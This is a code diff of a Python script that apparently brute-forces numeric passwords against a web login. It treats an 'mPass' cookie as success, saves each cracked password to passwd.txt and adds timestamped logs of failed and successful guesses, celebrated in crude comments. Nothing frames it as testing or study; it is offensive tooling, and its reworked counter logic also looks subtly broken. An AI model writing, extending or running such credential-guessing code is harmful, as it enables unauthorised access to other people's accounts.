@@ -44,13 +44,23 @@ def startrun(passwd,username,start):
         r.encoding = 'big5'
         rheader = r.headers['Set-Cookie']
         if 'mPass' in rheader:
+            dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
+            dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
+            twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
             #we fuck out the real passwd
             file = open('passwd.txt','a+')
             file.write(str(spasswd)+'\n')
             file.close()
             print('\n passwd is ' +spasswd)
+            file = open('log.txt','a')
+            item = '['+str(start)+','+twt+',]:Fucked the password,'+str(spasswd)+'\n'
+            file.write(item)
+            file.close()
             break
         else:
+            dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
+            dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
+            twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
             #not yet
             if start == True:
                 file = open('failed.txt','w')
@@ -61,11 +71,9 @@ def startrun(passwd,username,start):
             if start == True:
                 passwd += 1
             else:
-                passwd -= 1
-            if start == True:
-                dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
-                dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
-                twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
                 print("\r Running in two thread...."+spasswd+",Time:"+twt,end = "")
+            passwd -= 1
 
-
+            file = open('log.txt','a')
+            file.write('['+str(start)+','+twt+']Failed, tried ' + spasswd +'\n')
+            file.close()
